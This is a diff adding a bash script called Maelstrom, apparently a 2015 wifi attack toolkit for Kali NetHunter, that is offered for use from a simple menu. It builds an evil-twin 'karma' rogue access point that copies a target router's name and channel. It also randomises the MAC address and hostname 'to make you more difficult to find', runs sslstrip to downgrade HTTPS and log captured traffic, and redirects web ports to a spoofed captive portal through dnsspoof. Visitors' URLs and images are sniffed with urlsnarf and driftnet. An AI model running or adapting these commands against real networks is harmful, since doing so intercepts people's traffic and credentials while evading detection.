@@ -1,0 +1,199 @@
+#!/bin/bash
+
+#author : Armaal
+#year : 2015
+#info : wifi vector attack for kali nethunter
+
+f_interface(){
+clear
+echo "Maelstrom";
+
+echo -e "\e[93mAutomated scripties\e[0m"
+echo
+echo -e "\e[4mChose your flavor:\e[24m"
+echo
+echo -e "\e[34mRun EvilAP [1] in first!\e[0m"
+echo
+echo "1. Perform EvilAP "
+echo "2. Perform accespoint-soft "
+echo "3. Perform accespoint-ssl "
+echo "4. Perform accespoint-captive-portal  "
+echo "5. Perform urlsnarf  "
+echo "6. Perform driftnet "
+echo
+echo -e "\e[34mDon't forget to use tails.sh\e[0m"
+echo
+read -p "Choice: " interfacechoice
+echo
+
+  case $interfacechoice in
+    1) f_evilap ;;
+	2) f_accespoint-soft ;;
+	3) f_accespoint-ssl ;;
+	4) f_accespoint-dnspoof-captive ;;
+    5) f_urlsnarf ;;
+	6) f_driftnet;;
+  esac
+}
+echo
+echo
+f_accespoint-soft(){
+
+#cleanning iptable
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+
+#start to set rules on iptable based on the dhcpd.conf
+ifconfig at0 up
+ifconfig at0 192.168.7.1 netmask 255.255.255.0
+route add -net 192.168.7.0 netmask 255.255.255.0 gw 192.168.7.1
+pkill dhcpd
+/etc/init.d/isc-dhcp-server start
+
+#active router mod and configure some iptable
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
+iptables --append FORWARD --in-interface at0 -j ACCEPT
+}
+
+f_accespoint-ssl (){
+
+#cleanning iptable
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+
+#Start to set rules on iptables based on the dhcpd.conf
+ifconfig at0 up
+ifconfig at0 192.168.7.1 netmask 255.255.255.0
+route add -net 192.168.7.0 netmask 255.255.255.0 gw 192.168.7.1
+pkill dhcpd
+/etc/init.d/isc-dhcp-server start
+
+#Iptable rules
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
+iptables --append FORWARD --in-interface at0 -j ACCEPT
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
+#Launch ssltrip with log
+echo
+echo -e "\e[34mLogs saved to /sdcard/capture/ssl/\e[0m"
+logfile=/sdcard/capture/ssl/sslstrip_$(date +%F-%H%M).log
+echo
+echo -e "\e[35m*When you have finish the sslstrip (ctrl-C to escape)\e[0m"
+echo -e "\e[35m*You will be able to see the result in this terminal\e[0m"
+cd /opt/pwnpad/sslstrip
+python sslstrip.py -pfk -l 8888 -w $logfile
+echo
+echo -e "\e[96mLook at the results :\e[0m"
+echo
+tail -f $logfile
+}
+
+f_accespoint-dnspoof-captive(){
+
+#cleanning iptable
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+
+#Start to set rules on iptables based on the dhcpd.conf
+ifconfig at0 up
+ifconfig at0 192.168.7.1 netmask 255.255.255.0
+route add -net 192.168.7.0 netmask 255.255.255.0 gw 192.168.7.1
+
+#iptable rules
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
+iptables --append FORWARD --in-interface at0 -j ACCEPT
+
+#put the wlan0 ip
+echo -e "\e[34mGet a grep on wlan0\e[0m"
+echo -e "\e[34mcopy your wlan0 IP\e[0m"
+ifconfig wlan0 | grep "inet " | awk -F'[: ]+' '{ print $4 }'
+echo
+read -p "Enter wlan0 local ip ->" iplocal
+
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $iplocal:80
+iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $iplocal:80
+iptables -t nat -A POSTROUTING -j MASQUERADE
+pkill dhcpd
+echo -e "\e[31mDHCP-server start\e[0m"
+/etc/init.d/isc-dhcp-server start
+sleep 2s
+service apache2 restart
+sleep 1s
+echo -e "\e[31mSpoofing DNS\e[0m"
+echo -e "\e[34mLogs saved to /sdcard/capture/dnspoof/\e[0m"
+screen -dmS dnsspoof dnsspoof -i at0 -f /usr/local/hosts
+}
+
+#DRIFTNET#
+clear
+echo
+f_driftnet(){
+
+   echo -e "\e[93mdriftnet with verbose\e[0m"
+   driftnet -v -i at0
+}
+
+#URLSNARF#
+clear
+echo
+f_urlsnarf(){
+
+   echo -e "\e[93mLogs saved to /sdcard/capture/urlsnarf/\e[0m"
+   urlsnarf -i at0 >> /sdcard/capture/urlsnarf/urlsnarf_$(date +%F-%H%M).log
+}
+
+#EVILAP#
+clear
+echo
+f_evilap(){
+
+#change the hostname and mac address randomly
+echo -e "\e[35mRolling MAC address and Hostname randomly to make you more difficult to find\e[0m"
+ifconfig wlan1 down
+macchanger -r wlan1
+echo
+echo -e "\e[35mYour new local mac adress:\e[0m"
+hn=`ifconfig wlan1 |grep HWaddr |awk '{print$5}' |awk -F":" '{print$1$2$3$4$5$6}'`
+hostname $hn
+echo $hn
+echo
+echo -e " \e[44mLet's GO\e[0m"
+echo -e "\e[31mStop previous mon0\e[0m"
+airmon-ng stop mon0
+
+#Put wlan1 into monitor mode - mon0 created
+echo -e "\e[31mcreating the new mon0 from wlan1\e[0m"
+echo
+airmon-ng start wlan1
+echo -e "\e[92mIt's Ok\e[0m"
+clear
+
+#airbase-ng#
+echo -e "\e[96mSet up EvilAP in Bad Karma\e[0m"
+echo
+echo -e "\e[93mtarget the channel of the router\e[0m"
+echo -e "\e[93mtarget the name of the router\e[0m"
+echo
+read -p "Enter the Wi-Fi [AP Channel] : " channel
+read -p "Enter the Wi-Fi [ESSID] : " essid
+clear
+echo
+echo -e "\e[93mLogs saved to /sdcard/capture/evilap/\e[0m"
+echo -e "\e[34mEvilAP is running in background\e[0m"
+screen -dmS karma airbase-ng -P -C 60 -y -e $essid -c $channel -v wlan1mon 
+}
+ 
+#RUN INTERFACE#
+f_run(){
+  f_interface 
+  }
+ 
+f_run
